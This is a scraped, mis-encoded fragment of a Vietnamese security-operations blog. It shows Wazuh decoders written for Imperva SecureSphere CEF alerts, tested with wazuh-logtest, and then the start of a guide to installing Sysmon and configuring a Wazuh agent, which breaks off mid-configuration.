cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description **Phase 1: Completed pre-decoding. full event: \u0026#39;CEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description\u0026#39; **Phase 2: Completed decoding. Phase 2 khÃ´ng cÃ³ gÃ¬.\nPhÃ¢n tÃ­ch qua vá» cÃ¡c pháº§n cÃ³ trong log nÃ y. Pháº§n Ä‘áº§u tiÃªn lÃ  cÃ¡c Ä‘oáº¡n Ä‘Æ°á»£c phÃ¢n tÃ¡ch vá»›i nhau báº±ng \u0026ldquo;|\u0026rdquo;, pháº§n cÃ²n láº¡i lÃ  cÃ¡c trÆ°á»ng Ä‘Æ°á»£c phÃ¢n tÃ¡ch báº±ng \u0026ldquo;=\u0026rdquo;. Pháº§n sá»‘ 2 tÃ´i Ä‘Ã£ cÃ³ sáºµn tÃªn trÆ°á»ng do log Ä‘á»‹nh nghÄ©a. Vá»›i pháº§n Ä‘áº§u tiÃªn thÃ¬ cÃ³ thá»ƒ dá»±a vÃ o ná»™i dung cá»§a cÃ¡c Ä‘oáº¡n Ä‘á»ƒ Ä‘á»‹nh nghÄ©a tÃªn cÃ¡c trÆ°á»ng.\nÄáº§u tiÃªn táº¡o decoder cha vá»›i prematch\n\u0026lt;decoder name=\u0026#34;Imperva\u0026#34;\u0026gt; \u0026lt;prematch\u0026gt;CEF:0\\|Imperva Inc.\\|\u0026lt;/prematch\u0026gt; \u0026lt;/decoder\u0026gt; Tiáº¿p theo táº¡o decoder con Ä‘á»‹nh nghÄ©a cÃ¡c trÆ°á»ng cÃ³ trong pháº§n 1. KhÃ´ng tÃ­nh 2 Ä‘oáº¡n Ä‘áº§u dÃ¹ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh loáº¡i log á»Ÿ prematch thÃ¬ tÃ´i cÃ²n 5 Ä‘oáº¡n phÃ­a sau Ä‘á»ƒ gÃ¡n trÆ°á»ng. Vá»›i má»—i trÆ°á»ng tÃ´i sáº½ sá»­ dá»¥ng 1 regex Ä‘á»ƒ Ä‘áº¡i diá»‡n cho giÃ¡ trá»‹ cÃ³ thá»ƒ thay Ä‘á»•i.\n\u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;CEF:0\\|Imperva Inc.\\|(\\.+)\\|(\\.+)\\|(\\.+)\\|(\\.+)\\|(\\.+)\\|\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;application,version,event.type,event.name,severity\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; Náº¿u chá»‰ cÃ³ kÃ½ tá»± chá»¯ thÃ¬ cÃ³ thá»ƒ chá»n \\S, tuy nhiÃªn \u0026ldquo;Imperva Inc.\u0026rdquo; cÃ³ 1 dáº¥u cháº¥m á»Ÿ cuá»‘i nÃªn tÃ´i chá»n \\. Ä‘áº¡i diá»‡n cho kÃ½ tá»± báº¥t ká»³. Tuy nhiÃªn \\. chá»‰ Ä‘áº¡i diá»‡n cho 1 kÃ½ tá»±, hiá»ƒn thá»‹ Ä‘Æ°á»£c toÃ n bá»™ \u0026ldquo;Imperva Inc.\u0026rdquo; tÃ´i pháº£i thÃªm + vÃ o sau, () Ä‘á»ƒ nhÃ³m nÃ³ thÃ nh 1 khá»‘i vÃ  \\ á»Ÿ cuá»‘i Ä‘á»ƒ káº¿t thÃºc khá»‘i nÃ y.\nCuá»‘i cÃ¹ng lÃ  order dÃ¹ng Ä‘á»ƒ Ä‘á»‹nh nghÄ©a tÃªn cá»§a cÃ¡c khá»‘i phÃ­a trÃªn. TÃ´i cÃ³ 5 khá»‘i cáº§n gÃ¡n tÃªn, vÃ  phá»¥ thuá»™c vÃ o ná»™i dung cá»§a khá»‘i Ä‘Ã³ Ä‘á»ƒ xÃ¡c Ä‘á»‹nh khá»‘i nÃ y tÃªn tÃªn gÃ¬. VÃ­ dá»¥ nhÆ° khá»‘i Ä‘áº§u tiÃªn SecureSphere lÃ  tÃªn cá»§a sáº£n pháº©m nÃªn tÃ´i sáº½ gÃ¡n tÃªn khá»‘i nÃ y lÃ  application, hoáº·c khá»‘i cuá»‘i cÃ¹ng ná»™i dung lÃ  High - má»©c Ä‘á»™ nghiÃªm trá»ng, tÃ´i cÃ³ thá»ƒ gÃ¡n tÃªn severity.\nToÃ n bá»™ decoder cá»§a log trÃªn cÃ³ thá»ƒ Ä‘Æ°á»£c viáº¿t nhÆ° sau:\n\u0026lt;decoder name=\u0026#34;Imperva\u0026#34;\u0026gt; \u0026lt;prematch\u0026gt;CEF:0\\|Imperva Inc.\\|\u0026lt;/prematch\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;!--\u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; --\u0026gt; \u0026lt;!-- \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; --\u0026gt; \u0026lt;!-- \u0026lt;regex\u0026gt;\\|SIEMintegration\\|(\\.+)\\sfileId=\u0026lt;/regex\u0026gt; --\u0026gt; \u0026lt;!-- \u0026lt;order\u0026gt;IncapRules\u0026lt;/order\u0026gt; --\u0026gt; \u0026lt;!--\u0026lt;/decoder\u0026gt; --\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;CEF:0\\|Imperva Inc.\\|(\\.+)\\|(\\.+)\\|(\\.+)\\|(\\.+)\\|(\\.+)\\|\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;application,version,event.type,event.name,severity\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;fileId=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;fileID\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;sourceServiceName=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;sourceServiceName\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;siteid=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;siteid\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;requestClientApplication=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;requestClientApplication\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;deviceFacility=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;deviceFacility\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs2=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs2\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs2Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs2Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs3=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs3\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs3Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs3Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs1=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs1\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs1Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs1Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs4=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs4\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs4Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs4Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs5=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs5\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs5=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs5\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs5Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs5Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs6(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs6\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs6Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs6Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs7=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs7\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs7Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs7Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs8=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs8\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs8Label=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs8Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;customer=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;customer\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;start=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;start\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;request=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;request\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;requestMethod=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;requestMethod\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;app=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;app\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;act=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;action\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;deviceExternalId=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;deviceExternalId\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cpt=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cpt\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;src=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;src\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;dst=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;dst\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;dpt=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;dpt\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;duser=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;duser\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;rt=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;rt\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cat=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cat\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;proto=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;protocol\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;ver=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;ver\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;end=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;end\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;fileType=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;fileType\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;filePermission=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;filePermission\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs9=(\\.+) \\w+=\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs9\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; \u0026lt;decoder name=\u0026#34;Imperva_child\u0026#34;\u0026gt; \u0026lt;parent\u0026gt;Imperva\u0026lt;/parent\u0026gt; \u0026lt;regex\u0026gt;cs9Label=(\\.+) \\w+\u0026lt;/regex\u0026gt; \u0026lt;order\u0026gt;cs9Label\u0026lt;/order\u0026gt; \u0026lt;/decoder\u0026gt; Kiá»ƒm tra decoder vá»›i wazuh-logtest\nroot@dc-siemtest:/home/siemadmin# /var/ossec/bin/wazuh-logtest Starting wazuh-logtest v4.4.5 Type one log per line CEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description **Phase 1: Completed pre-decoding. full event: \u0026#39;CEF:0|Imperva Inc.|SecureSphere|10.6.0|Recommended Signatures Policy for Web Applications|Recommended Signatures Policy for Web Applications|High|act=Block dst=10.11.12.13 dpt=443 duser=n/a src=103.187.191.141 spt=36614 proto=TCP rt=Apr 26 2023 13:08:12 cat=Alert cs1=Recommended Signatures Policy for Web Applications cs1Label=Policy cs2=mail.re-toor.vn cs2Label=ServerGroup cs3=mail cs3Label=ServiceName cs4=mail.re-toor.vn cs4Label=ApplicationName cs5=Nmap scanner cs5Label=Description\u0026#39; **Phase 2: Completed decoding. name: \u0026#39;Imperva\u0026#39; action: \u0026#39;Block\u0026#39; application: \u0026#39;SecureSphere\u0026#39; cat: \u0026#39;Alert\u0026#39; cs1: \u0026#39;Recommended Signatures Policy for Web Applications\u0026#39; cs1Label: \u0026#39;Policy\u0026#39; cs2: \u0026#39;mail.re-toor.vn\u0026#39; cs2Label: \u0026#39;ServerGroup\u0026#39; cs3: \u0026#39;mail\u0026#39; cs3Label: \u0026#39;ServiceName\u0026#39; cs4: \u0026#39;mail.re-toor.vn\u0026#39; cs4Label: \u0026#39;ApplicationName\u0026#39; cs5: \u0026#39;Nmap scanner\u0026#39; dpt: \u0026#39;443\u0026#39; dst: \u0026#39;10.11.12.13\u0026#39; duser: \u0026#39;n/a\u0026#39; event.name: \u0026#39;Recommended Signatures Policy for Web Applications\u0026#39; event.type: \u0026#39;Recommended Signatures Policy for Web Applications\u0026#39; protocol: \u0026#39;TCP\u0026#39; rt: \u0026#39;Apr 26 2023 13:08:12\u0026#39; severity: \u0026#39;High\u0026#39; src: \u0026#39;103.187.191.141\u0026#39; version: \u0026#39;10.6.0\u0026#39; ThÃ nh cÃ´ng.\n","date":"1 June 2023","externalUrl":null,"permalink":"/soc/wazuh-custom-rules-and-decoders-part-1/","section":"SOC","summary":"","title":"Viáº¿t Decoders vÃ  Rules cho há»‡ thá»‘ng Wazuh - Part 1","type":"soc"},{"content":"Wazuh cung cáº¥p pháº§n má»m phÃ­a ngÆ°á»i dÃ¹ng Ä‘á»ƒ thu tháº­p vÃ  giÃ¡m sÃ¡t cÃ¡c hoáº¡t Ä‘á»™ng cá»§a ngÆ°á»i dÃ¹ng trÃªn mÃ¡y Ä‘Ã³. CÃ¡c Wazuh agents sáº½ cháº¡y ngáº§m giá»‘ng nhÆ° Windows Defenders (vÃ­ dá»¥ tháº¿), thu tháº­p toÃ n bá»™ cÃ¡c thay Ä‘á»•i trÃªn mÃ¡y tÃ­nh cá»§a ngÆ°á»i dÃ¹ng vÃ  gá»­i log vá» Wazuh manager.\nTuy nhiÃªn, Ä‘á»ƒ agent Ä‘Æ°á»£c giÃ¡m sÃ¡t má»™t cÃ¡ch chi tiáº¿t vÃ  máº¡nh máº½ nháº¥t, cáº§n cÃ i thÃªm cÃ´ng cá»¥ há»— trá»£ cho Wazuh-agent, Ä‘Ã³ lÃ  Sysmon (cho Windows) vÃ  Packetbeat (cho Linux)\nWindows OS # Sysmon # System Monitor (Sysmon) lÃ  má»™t dá»‹ch vá»¥ há»‡ thá»‘ng cá»§a Windows cho phÃ©p ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ theo dÃµi Ä‘Æ°á»£c cÃ¡c hoáº¡t Ä‘á»™ng diá»…n ra trong windows nhÆ° viá»‡c táº¡o quy trÃ¬nh, cÃ¡c káº¿t ná»‘i máº¡ng hay sá»± thay Ä‘á»•i cá»§a 1 file nÃ o Ä‘Ã³. VÃ¬ váº­y nÃ³ ráº¥t há»¯u Ã­ch trong viá»‡c phÃ¢n tÃ­ch vÃ  quáº£n lÃ½ log trÃªn SIEM.\nÄá»ƒ cho viá»‡c chuáº©n hÃ³a log Ä‘Æ°á»£c dá»… dÃ ng hÆ¡n, tÃ´i sáº½ sá»­ dá»¥ng má»™t cáº¥u hÃ¬nh Sysmon cÃ³ sáºµn mÃ  tÃ´i tÃ¬m tháº¥y trÃªn github á»Ÿ Ä‘Ã¢y\nTrong má»™t cÃ¡c mÃ´i trÆ°á»ng doanh nghiá»‡p, viá»‡c sá»­ dá»¥ng proxy server sáº½ ngÄƒn chÃºng ta cháº¡y cÃ¡c scripts tá»± Ä‘á»™ng táº£i file trá»±c tiáº¿p tá»« internet. Váº­y nÃªn cÃ¡ch lÃ m cá»§a tÃ´i lÃ  táº£i vá» trÆ°á»›c vÃ  cháº¡y sau (Ã¡p dá»¥ng cho cáº£ Windows vÃ  Linux).\nViá»‡c Ä‘áº§u tiÃªn lÃ  táº£i Sysmon tá»« trang chá»§ cá»§a Micorsoft vÃ  giáº£i nÃ©n nÃ³\nSau Ä‘Ã³ táº£i file config á»Ÿ github repo phÃ­a trÃªn vá» vÃ  lÆ°u nÃ³ vÃ o thÆ° má»¥c vá»«a giáº£i nÃ©n phÃ­a trÃªn.\nTiáº¿p theo tÃ´i sáº½ táº¡o 1 file Powershell Ä‘á»ƒ cháº¡y Sysmon vá»›i cáº¥u hÃ¬nh cá»§a file config phÃ­a trÃªn.\n$serviceName = \u0026#39;Sysmon64\u0026#39; If (Get-Service $serviceName -ErrorAction SilentlyContinue) { write-host (\u0026#39;Sysmon Is Already Installed\u0026#39;) } else { Invoke-Command {reg.exe ADD HKCU\\Software\\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f} Invoke-Command {reg.exe ADD HKU\\.DEFAULT\\Software\\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f} Start-Process Sysmon64.exe -Argumentlist @(\u0026#34;-i\u0026#34;, \u0026#34;sysmonconfig.xml\u0026#34;) } LÆ°u láº¡i file nÃ y vá»›i tÃªn run.ps1\nLÆ°u Ã½: pháº£i Ä‘á»ƒ táº¥t cáº£ file nÃ y vÃ o thÆ° má»¥c SysinternalsSuite Ä‘Ã£ giáº£i nÃ©n thÃ¬ má»›i cháº¡y Ä‘Æ°á»£c\nSau Ä‘Ã³ cháº¡y file run.ps1 vá»›i Powershell\nÄá»ƒ kiá»ƒm tra xem Sysmon Ä‘Ã£ cÃ i Ä‘áº·t thÃ nh cÃ´ng hay chÆ°a, tÃ´i sáº½ má»Ÿ Windows vÃ  tÃ¬m Event Viewer. Sau Ä‘Ã³ chá»n Applications and Services Logs -\u0026gt; Microsoft -\u0026gt; Windows. KÃ©o xuá»‘ng tÃ¬m Sysmon, náº¿u cÃ³ Operational nghÄ©a lÃ  thÃ nh cÃ´ng vÃ  cÃ³ thá»ƒ kiá»ƒm tra log ngay trong Ä‘Ã³\nCÃ i Ä‘áº·t Wazuh-agent cho windows # TrÆ°á»›c tiÃªn, trÃªn Wazuh-manager tÃ´i táº¡o 2 group cho agent cá»§a 2 OS lÃ  windows vÃ  linux. Manager cÃ³ cÆ¡ cháº¿ thay Ä‘á»•i Ä‘Æ°á»£c cáº¥u hÃ¬nh ghi nháº­n log cá»§a agent tÃ¹y theo cáº¥u hÃ¬nh cá»§a group.\nSau khi táº¡o group vá»›i tÃªn OS-WINDOWS, tÃ´i sáº½ sá»­a Ä‘á»•i cáº¥u hÃ¬nh cá»§a group nhÆ° bÃªn dÆ°á»›i Ä‘á»ƒ cÃ³ thá»ƒ nháº­n log tá»« Sysmon\n\u0026lt;agent_config\u0026gt; \u0026lt;client_buffer\u0026gt; \u0026lt;!-- Agent buffer options --\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;queue_size\u0026gt;5000\u0026lt;/queue_size\u0026gt; \u0026lt;events_per_second\u0026gt;500\u0026lt;/events_per_second\u0026gt; \u0026lt;/client_buffer\u0026gt; \u0026lt;!-- Policy monitoring --\u0026gt; \u0026lt;rootcheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; 